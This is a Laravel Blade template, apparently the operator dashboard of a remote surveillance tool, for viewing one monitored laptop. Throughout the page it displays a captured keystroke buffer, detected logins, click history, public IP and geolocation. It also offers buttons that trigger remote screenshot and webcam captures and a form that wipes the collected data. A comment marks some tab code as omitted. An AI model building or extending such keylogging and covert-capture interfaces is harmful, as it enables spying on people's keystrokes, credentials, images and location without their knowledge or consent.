@extends('layouts.app')

@section('title', $notebook->identificador)

@section('content')
<div class="container-fluid">
    <div class="row">
        <div class="col-12">
            <!-- Cabeçalho com Botões de Ação -->
            <div class="d-flex justify-content-between align-items-center mb-4">
                <div class="d-flex align-items-center">
                    <h1 class="mb-0 me-3">
                        <i class="fas fa-laptop me-2"></i>{{ $notebook->identificador }}
                    </h1>
                    <span class="badge bg-{{ $notebook->estaOnline ? 'success' : 'secondary' }} fs-6">
                        {{ $notebook->estaOnline ? '🟢 ONLINE' : '🔴 OFFLINE' }}
                    </span>
                </div>
                <div class="d-flex gap-2">
                    <!-- Botão Limpar Dados -->
                    <button type="button" class="btn btn-outline-danger" data-bs-toggle="modal" data-bs-target="#limparDadosModal">
                        <i class="fas fa-trash me-1"></i>Limpar Dados
                    </button>
                    
                    <!-- Botão Capturar Tela -->
                    <form action="{{ route('admin.notebooks.comando', $notebook->id) }}" method="POST" class="d-inline">
                        @csrf
                        <input type="hidden" name="acao" value="screenshot">
                        <button type="submit" class="btn btn-outline-primary">
                            <i class="fas fa-camera me-1"></i>Capturar Tela
                        </button>
                    </form>
                    
                    <!-- Botão Capturar Webcam -->
                    <form action="{{ route('admin.notebooks.comando', $notebook->id) }}" method="POST" class="d-inline">
                        @csrf
                        <input type="hidden" name="acao" value="webcam">
                        <button type="submit" class="btn btn-outline-info">
                            <i class="fas fa-user me-1"></i>Capturar Webcam
                        </button>
                    </form>
                    
                    <a href="{{ route('admin.notebooks.index') }}" class="btn btn-outline-secondary">
                        <i class="fas fa-arrow-left me-1"></i>Voltar
                    </a>
                </div>
            </div>

            <!-- Modal para Limpar Dados -->
            <div class="modal fade" id="limparDadosModal" tabindex="-1">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title">Limpar Dados Coletados</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                        </div>
                        <div class="modal-body">
                            <p>Selecione quais dados deseja limpar:</p>
                            
                            <form id="limparDadosForm" action="{{ route('admin.notebooks.limpar-dados', $notebook->id) }}" method="POST">
                                @csrf
                                @method('DELETE')
                                
                                <div class="mb-3">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="dados[]" value="screenshot" id="limparScreenshot">
                                        <label class="form-check-label" for="limparScreenshot">
                                            <i class="fas fa-camera text-danger me-1"></i> Screenshots
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="dados[]" value="webcam" id="limparWebcam">
                                        <label class="form-check-label" for="limparWebcam">
                                            <i class="fas fa-user text-info me-1"></i> Imagens da Webcam
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="dados[]" value="keylog" id="limparKeylog">
                                        <label class="form-check-label" for="limparKeylog">
                                            <i class="fas fa-keyboard text-warning me-1"></i> Histórico de Teclas
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="dados[]" value="cliques" id="limparCliques">
                                        <label class="form-check-label" for="limparCliques">
                                            <i class="fas fa-mouse-pointer text-success me-1"></i> Histórico de Cliques
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="dados[]" value="logins" id="limparLogins">
                                        <label class="form-check-label" for="limparLogins">
                                            <i class="fas fa-sign-in-alt text-primary me-1"></i> Logins Detectados
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="dados[]" value="todos" id="limparTodos">
                                        <label class="form-check-label fw-bold" for="limparTodos">
                                            <i class="fas fa-broom text-danger me-1"></i> LIMPAR TUDO
                                        </label>
                                    </div>
                                </div>
                                
                                <div class="alert alert-warning">
                                    <i class="fas fa-exclamation-triangle me-2"></i>
                                    <strong>Atenção:</strong> Esta ação não pode ser desfeita. Os dados selecionados serão permanentemente removidos.
                                </div>
                            </form>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancelar</button>
                            <button type="button" class="btn btn-danger" onclick="confirmarLimpeza()">
                                <i class="fas fa-trash me-1"></i>Limpar Dados Selecionados
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Cards de Status Rápidos -->
            <div class="row mb-4">
                <div class="col-xl-2 col-md-4">
                    <div class="card bg-primary text-white">
                        <div class="card-body">
                            <div class="d-flex justify-content-between">
                                <div>
                                    <h6 class="card-title text-white-50">ÚLTIMA ATIVIDADE</h6>
                                    <h6 class="mb-0">
                                        @if($notebook->ultimo_heartbeat)
                                            {{ $notebook->ultimo_heartbeat->diffForHumans() }}
                                        @else
                                            Nunca
                                        @endif
                                    </h6>
                                </div>
                                <div class="align-self-center">
                                    <i class="fas fa-heartbeat fa-2x"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="col-xl-2 col-md-4">
                    <div class="card bg-success text-white">
                        <div class="card-body">
                            <div class="d-flex justify-content-between">
                                <div>
                                    <h6 class="card-title text-white-50">LOCALIZAÇÃO</h6>
                                    <h6 class="mb-0">
                                        @if(isset($notebook->info_sistema['localizacao']['cidade']))
                                            {{ $notebook->info_sistema['localizacao']['cidade'] }}
                                        @else
                                            Não detectada
                                        @endif
                                    </h6>
                                </div>
                                <div class="align-self-center">
                                    <i class="fas fa-map-marker-alt fa-2x"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="col-xl-2 col-md-4">
                    <div class="card bg-info text-white">
                        <div class="card-body">
                            <div class="d-flex justify-content-between">
                                <div>
                                    <h6 class="card-title text-white-50">APLICAÇÃO</h6>
                                    <h6 class="mb-0">
                                        @if(isset($notebook->info_sistema['aplicativo_atual']['nome_processo']))
                                            {{ pathinfo($notebook->info_sistema['aplicativo_atual']['nome_processo'], PATHINFO_FILENAME) }}
                                        @else
                                            Desconhecido
                                        @endif
                                    </h6>
                                </div>
                                <div class="align-self-center">
                                    <i class="fas fa-window-restore fa-2x"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="col-xl-2 col-md-4">
                    <div class="card bg-warning text-dark">
                        <div class="card-body">
                            <div class="d-flex justify-content-between">
                                <div>
                                    <h6 class="card-title text-dark-50">TECLAS</h6>
                                    <h6 class="mb-0">
                                        {{ $notebook->historico_teclas && is_array($notebook->historico_teclas) ? count($notebook->historico_teclas) : 0 }}
                                    </h6>
                                </div>
                                <div class="align-self-center">
                                    <i class="fas fa-keyboard fa-2x"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-xl-2 col-md-4">
                    <div class="card bg-danger text-white">
                        <div class="card-body">
                            <div class="d-flex justify-content-between">
                                <div>
                                    <h6 class="card-title text-white-50">CLIQUES</h6>
                                    <h6 class="mb-0">
                                        {{ $notebook->historico_cliques && is_array($notebook->historico_cliques) ? count($notebook->historico_cliques) : 0 }}
                                    </h6>
                                </div>
                                <div class="align-self-center">
                                    <i class="fas fa-mouse-pointer fa-2x"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-xl-2 col-md-4">
                    <div class="card bg-secondary text-white">
                        <div class="card-body">
                            <div class="d-flex justify-content-between">
                                <div>
                                    <h6 class="card-title text-white-50">LOGINS</h6>
                                    <h6 class="mb-0">
                                        {{ $notebook->historico_logins && is_array($notebook->historico_logins) ? count($notebook->historico_logins) : 0 }}
                                    </h6>
                                </div>
                                <div class="align-self-center">
                                    <i class="fas fa-sign-in-alt fa-2x"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="row">
                <!-- Coluna Esquerda - Informações do Sistema -->
                <div class="col-lg-6">
                    <!-- Informações Básicas -->
                    <div class="card mb-4">
                        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
                            <h5 class="mb-0">
                                <i class="fas fa-info-circle me-2"></i>Informações do Sistema
                            </h5>
                            <span class="badge bg-light text-dark">
                                <i class="fas fa-sync-alt me-1"></i>Auto-update
                            </span>
                        </div>
                        <div class="card-body">
                            <div class="row">
                                <div class="col-md-6">
                                    <table class="table table-sm table-borderless">
                                        <tr>
                                            <th class="text-muted">Usuário:</th>
                                            <td>
                                                <i class="fas fa-user me-1 text-primary"></i>
                                                {{ $notebook->usuario_atual ?? 'N/A' }}
                                            </td>
                                        </tr>
                                        <tr>
                                            <th class="text-muted">IP Local:</th>
                                            <td>
                                                <i class="fas fa-network-wired me-1 text-info"></i>
                                                {{ $notebook->ip_address ?? 'N/A' }}
                                            </td>
                                        </tr>
                                        <tr>
                                            <th class="text-muted">Hostname:</th>
                                            <td>
                                                <i class="fas fa-desktop me-1 text-secondary"></i>
                                                {{ $notebook->hostname ?? 'N/A' }}
                                            </td>
                                        </tr>
                                    </table>
                                </div>
                                <div class="col-md-6">
                                    <table class="table table-sm table-borderless">
                                        <tr>
                                            <th class="text-muted">Sistema:</th>
                                            <td>
                                                <i class="fab fa-windows me-1 text-success"></i>
                                                {{ $notebook->sistema_operacional ?? 'N/A' }}
                                            </td>
                                        </tr>
                                        <tr>
                                            <th class="text-muted">Último Login:</th>
                                            <td>
                                                <i class="fas fa-sign-in-alt me-1 text-warning"></i>
                                                {{ $notebook->ultimo_login ? $notebook->ultimo_login->format('d/m/Y H:i') : 'Nunca' }}
                                            </td>
                                        </tr>
                                        <tr>
                                            <th class="text-muted">Heartbeat:</th>
                                            <td>
                                                <i class="fas fa-heart me-1 text-danger"></i>
                                                {{ $notebook->ultimo_heartbeat ? $notebook->ultimo_heartbeat->format('d/m/Y H:i') : 'Nunca' }}
                                            </td>
                                        </tr>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Localização e Rede -->
                    @if($notebook->info_sistema && isset($notebook->info_sistema['localizacao']))
                    <div class="card mb-4">
                        <div class="card-header bg-primary text-white">
                            <h5 class="mb-0">
                                <i class="fas fa-map-marked-alt me-2"></i>Localização & Rede
                            </h5>
                        </div>
                        <div class="card-body">
                            @php $loc = $notebook->info_sistema['localizacao']; @endphp
                            <div class="row">
                                <div class="col-md-6">
                                    <h6><i class="fas fa-globe-americas me-2 text-info"></i>Localização</h6>
                                    <table class="table table-sm table-borderless">
                                        <tr>
                                            <td class="text-muted">Cidade:</td>
                                            <td><strong>{{ $loc['cidade'] ?? 'N/A' }}</strong></td>
                                        </tr>
                                        <tr>
                                            <td class="text-muted">Estado:</td>
                                            <td>{{ $loc['estado'] ?? 'N/A' }}</td>
                                        </tr>
                                        <tr>
                                            <td class="text-muted">País:</td>
                                            <td>{{ $loc['pais'] ?? 'N/A' }}</td>
                                        </tr>
                                    </table>
                                </div>
                                <div class="col-md-6">
                                    <h6><i class="fas fa-wifi me-2 text-success"></i>Rede</h6>
                                    <table class="table table-sm table-borderless">
                                        <tr>
                                            <td class="text-muted">IP Público:</td>
                                            <td><code>{{ $loc['ip_publico'] ?? 'N/A' }}</code></td>
                                        </tr>
                                        <tr>
                                            <td class="text-muted">Provedor:</td>
                                            <td>{{ $loc['provedor'] ?? 'N/A' }}</td>
                                        </tr>
                                        <tr>
                                            <td class="text-muted">Coordenadas:</td>
                                            <td>
                                                @if(isset($loc['lat']) && isset($loc['lng']))
                                                    {{ $loc['lat'] }}, {{ $loc['lng'] }}
                                                @else
                                                    N/A
                                                @endif
                                            </td>
                                        </tr>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                    @endif

                    <!-- Hardware -->
                    @if($notebook->info_sistema && isset($notebook->info_sistema['hardware']))
                    <div class="card mb-4">
                        <div class="card-header bg-success text-white">
                            <h5 class="mb-0">
                                <i class="fas fa-microchip me-2"></i>Hardware
                            </h5>
                        </div>
                        <div class="card-body">
                            @php $hw = $notebook->info_sistema['hardware']; @endphp
                            <div class="row">
                                <div class="col-md-6 mb-3">
                                    <h6>CPU</h6>
                                    <div class="progress mb-2" style="height: 20px;">
                                        <div class="progress-bar bg-{{ $hw['cpu_percent'] > 80 ? 'danger' : ($hw['cpu_percent'] > 60 ? 'warning' : 'success') }}" 
                                             style="width: {{ $hw['cpu_percent'] }}%">
                                            {{ $hw['cpu_percent'] }}%
                                        </div>
                                    </div>
                                    <small class="text-muted">Uso do Processador</small>
                                </div>
                                
                                <div class="col-md-6 mb-3">
                                    <h6>Memória</h6>
                                    <div class="progress mb-2" style="height: 20px;">
                                        <div class="progress-bar bg-{{ $hw['memoria_percent'] > 80 ? 'danger' : ($hw['memoria_percent'] > 60 ? 'warning' : 'info') }}" 
                                             style="width: {{ $hw['memoria_percent'] }}%">
                                            {{ $hw['memoria_percent'] }}%
                                        </div>
                                    </div>
                                    <small class="text-muted">
                                        {{ $hw['memoria_usada'] ?? 0 }}GB / {{ $hw['memoria_total'] ?? 0 }}GB
                                    </small>
                                </div>
                                
                                <div class="col-md-6 mb-3">
                                    <h6>Disco</h6>
                                    <div class="progress mb-2" style="height: 20px;">
                                        <div class="progress-bar bg-{{ $hw['disco_percent'] > 80 ? 'danger' : ($hw['disco_percent'] > 60 ? 'warning' : 'secondary') }}" 
                                             style="width: {{ $hw['disco_percent'] }}%">
                                            {{ $hw['disco_percent'] }}%
                                        </div>
                                    </div>
                                    <small class="text-muted">
                                        {{ $hw['disco_usado'] ?? 0 }}GB / {{ $hw['disco_total'] ?? 0 }}GB
                                    </small>
                                </div>
                            </div>
                        </div>
                    </div>
                    @endif
                </div>

                <!-- Coluna Direita - Mídias e Dados -->
                <div class="col-lg-6">
                    <!-- Mídias Capturadas -->
                    <div class="card mb-4">
                        <div class="card-header bg-info text-white d-flex justify-content-between align-items-center">
                            <h5 class="mb-0">
                                <i class="fas fa-camera me-2"></i>Mídias Capturadas
                            </h5>
                            <div class="btn-group">
                                <form action="{{ route('admin.notebooks.comando', $notebook->id) }}" method="POST" class="d-inline">
                                    @csrf
                                    <input type="hidden" name="acao" value="screenshot">
                                    <button type="submit" class="btn btn-sm btn-light">
                                        <i class="fas fa-camera me-1"></i>Nova
                                    </button>
                                </form>
                                <form action="{{ route('admin.notebooks.comando', $notebook->id) }}" method="POST" class="d-inline">
                                    @csrf
                                    <input type="hidden" name="acao" value="webcam">
                                    <button type="submit" class="btn btn-sm btn-light">
                                        <i class="fas fa-user me-1"></i>Webcam
                                    </button>
                                </form>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="row">
                                <div class="col-md-6 text-center mb-3">
                                    <h6 class="border-bottom pb-2">📸 Screenshot</h6>
                                    @if($notebook->screenshot)
                                        <img src="data:image/jpeg;base64,{{ $notebook->screenshot }}" 
                                             class="img-thumbnail w-100 mb-2" 
                                             style="max-height: 200px; object-fit: cover; cursor: pointer;"
                                             data-bs-toggle="modal" data-bs-target="#screenshotModal">
                                        <div class="d-grid gap-1">
                                            <a href="{{ route('admin.notebooks.download', ['id' => $notebook->id, 'tipo' => 'screenshot']) }}" 
                                               class="btn btn-sm btn-outline-primary">
                                                <i class="fas fa-download me-1"></i>Download
                                            </a>
                                        </div>
                                    @else
                                        <div class="text-center text-muted py-5 border rounded">
                                            <i class="fas fa-camera fa-3x mb-3 opacity-50"></i>
                                            <p class="mb-0">Nenhuma screenshot</p>
                                            <small>Clique em "Nova" para capturar</small>
                                        </div>
                                    @endif
                                </div>
                                <div class="col-md-6 text-center mb-3">
                                    <h6 class="border-bottom pb-2">👤 Webcam</h6>
                                    @if($notebook->webcam)
                                        <img src="data:image/jpeg;base64,{{ $notebook->webcam }}" 
                                             class="img-thumbnail w-100 mb-2" 
                                             style="max-height: 200px; object-fit: cover; cursor: pointer;"
                                             data-bs-toggle="modal" data-bs-target="#webcamModal">
                                        <div class="d-grid gap-1">
                                            <a href="{{ route('admin.notebooks.download', ['id' => $notebook->id, 'tipo' => 'webcam']) }}" 
                                               class="btn btn-sm btn-outline-primary">
                                                <i class="fas fa-download me-1"></i>Download
                                            </a>
                                        </div>
                                    @else
                                        <div class="text-center text-muted py-5 border rounded">
                                            <i class="fas fa-user fa-3x mb-3 opacity-50"></i>
                                            <p class="mb-0">Nenhuma webcam</p>
                                            <small>Clique em "Webcam" para capturar</small>
                                        </div>
                                    @endif
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Keylog Buffer -->
                    @if($notebook->keylog_buffer)
                    <div class="card mb-4">
                        <div class="card-header bg-warning text-dark d-flex justify-content-between align-items-center">
                            <h5 class="mb-0">
                                <i class="fas fa-keyboard me-2"></i>Keylog Buffer
                                <span class="badge bg-dark">{{ strlen($notebook->keylog_buffer) }} chars</span>
                            </h5>
                            <button class="btn btn-sm btn-outline-danger" onclick="limparDadosEspecificos('keylog')">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                        <div class="card-body">
                            <div class="keylog-container" style="max-height: 200px; overflow-y: auto;">
                                <pre class="mb-0 p-3 border rounded small">{{ $notebook->keylog_buffer }}</pre>
                            </div>
                        </div>
                    </div>
                    @endif

                    <!-- Aplicativo Atual -->
                    @if($notebook->info_sistema && isset($notebook->info_sistema['aplicativo_atual']))
                    <div class="card mb-4">
                        <div class="card-header bg-secondary text-white">
                            <h5 class="mb-0">
                                <i class="fas fa-window-restore me-2"></i>Aplicativo em Foco
                            </h5>
                        </div>
                        <div class="card-body">
                            @php $app = $notebook->info_sistema['aplicativo_atual']; @endphp
                            <div class="d-flex align-items-center">
                                <div class="flex-shrink-0">
                                    <i class="fas fa-window-maximize fa-2x text-muted"></i>
                                </div>
                                <div class="flex-grow-1 ms-3">
                                    <h6 class="mb-1">{{ $app['nome_processo'] ?? 'Desconhecido' }}</h6>
                                    <p class="text-muted small mb-0">{{ $app['titulo_janela'] ?? 'N/A' }}</p>
                                    <small class="text-muted">
                                        PID: {{ $app['pid'] ?? 'N/A' }} | 
                                        Atualizado: {{ isset($app['timestamp']) ? \Carbon\Carbon::parse($app['timestamp'])->format('H:i:s') : 'N/A' }}
                                    </small>
                                </div>
                            </div>
                        </div>
                    </div>
                    @endif
                </div>
            </div>

            <!-- Resto do código das abas permanece igual -->
            <!-- ... -->
        </div>
    </div>
</div>

<!-- Modais para imagens (permanecem iguais) -->
@if($notebook->screenshot)
<div class="modal fade" id="screenshotModal" tabindex="-1">
    <div class="modal-dialog modal-xl">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Screenshot - {{ $notebook->identificador }}</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body text-center">
                <img src="data:image/jpeg;base64,{{ $notebook->screenshot }}" class="img-fluid">
            </div>
        </div>
    </div>
</div>
@endif

@if($notebook->webcam)
<div class="modal fade" id="webcamModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Webcam - {{ $notebook->identificador }}</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body text-center">
                <img src="data:image/jpeg;base64,{{ $notebook->webcam }}" class="img-fluid rounded">
            </div>
        </div>
    </div>
</div>
@endif
@endsection

@section('scripts')
<script>
// Auto-refresh a cada 30 segundos
setInterval(function() {
    location.reload();
}, 30000);

// Função para confirmar limpeza de dados
function confirmarLimpeza() {
    const form = document.getElementById('limparDadosForm');
    const checkboxes = form.querySelectorAll('input[type="checkbox"]:checked');
    
    if (checkboxes.length === 0) {
        alert('Selecione pelo menos um tipo de dado para limpar.');
        return;
    }
    
    if (confirm('Tem certeza que deseja limpar os dados selecionados? Esta ação não pode ser desfeita.')) {
        // Mostrar loading
        const btn = event.target;
        const originalText = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin me-1"></i>Limpando...';
        btn.disabled = true;
        
        form.submit();
    }
}

// Função para limpar dados específicos
function limparDadosEspecificos(tipo) {
    if (confirm(`Deseja limpar todos os dados de ${tipo}?`)) {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = '{{ route("admin.notebooks.limpar-dados", $notebook->id) }}';
        
        const csrf = document.createElement('input');
        csrf.type = 'hidden';
        csrf.name = '_token';
        csrf.value = '{{ csrf_token() }}';
        
        const method = document.createElement('input');
        method.type = 'hidden';
        method.name = '_method';
        method.value = 'DELETE';
        
        const dados = document.createElement('input');
        dados.type = 'hidden';
        dados.name = 'dados[]';
        dados.value = tipo;
        
        form.appendChild(csrf);
        form.appendChild(method);
        form.appendChild(dados);
        
        document.body.appendChild(form);
        form.submit();
    }
}

// Inicialização quando o documento estiver pronto
document.addEventListener('DOMContentLoaded', function() {
    // Tooltips
    var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
    var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
        return new bootstrap.Tooltip(tooltipTriggerEl)
    });

    // Alternar entre abas e salvar preferência
    const activeTab = localStorage.getItem('activeNotebookTab');
    if (activeTab) {
        const tab = document.querySelector(`#${activeTab}-tab`);
        if (tab) {
            new bootstrap.Tab(tab).show();
        }
    }
    
    document.querySelectorAll('#historicoTabs .nav-link').forEach(tab => {
        tab.addEventListener('shown.bs.tab', function (e) {
            localStorage.setItem('activeNotebookTab', e.target.id.replace('-tab', ''));
        });
    });

    // Feedback visual para envio de comandos
    document.querySelectorAll('form[action*="comando"]').forEach(form => {
        form.addEventListener('submit', function(e) {
            const btn = this.querySelector('button[type="submit"]');
            const originalText = btn.innerHTML;
            
            btn.innerHTML = '<i class="fas fa-spinner fa-spin me-1"></i>Enviando...';
            btn.disabled = true;
            
            setTimeout(() => {
                btn.innerHTML = originalText;
                btn.disabled = false;
            }, 3000);
        });
    });

    // Quando selecionar "Limpar Tudo", marcar todos os checkboxes
    const limparTodosCheckbox = document.getElementById('limparTodos');
    if (limparTodosCheckbox) {
        limparTodosCheckbox.addEventListener('change', function() {
            const checkboxes = document.querySelectorAll('#limparDadosForm input[type="checkbox"]');
            checkboxes.forEach(checkbox => {
                if (checkbox.id !== 'limparTodos') {
                    checkbox.checked = this.checked;
                }
            });
        });
    }
});
</script>


<style>
.card {
    box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075);
    border: 1px solid rgba(0, 0, 0, 0.125);
}

.card-header {
    border-bottom: 1px solid rgba(0, 0, 0, 0.125);
}

.table th {
    border-top: none;
    font-weight: 600;
}

.progress {
    border-radius: 10px;
}

.badge {
    font-size: 0.75em;
}

.nav-tabs .nav-link {
    border: none;
    border-bottom: 3px solid transparent;
}

.nav-tabs .nav-link.active {
    border-bottom: 3px solid #0d6efd;
    background: transparent;
}

.keylog-container pre {
    font-family: 'Courier New', monospace;
    font-size: 0.8rem;
    line-height: 1.4;
}

.table-hover tbody tr:hover {
    background-color: rgba(0, 0, 0, 0.025);
}

.sticky-top {
    position: sticky;
    top: 0;
    z-index: 10;
}

.btn-group .btn {
    border-radius: 0.375rem;
    margin-left: 0.25rem;
}
</style>
@endsection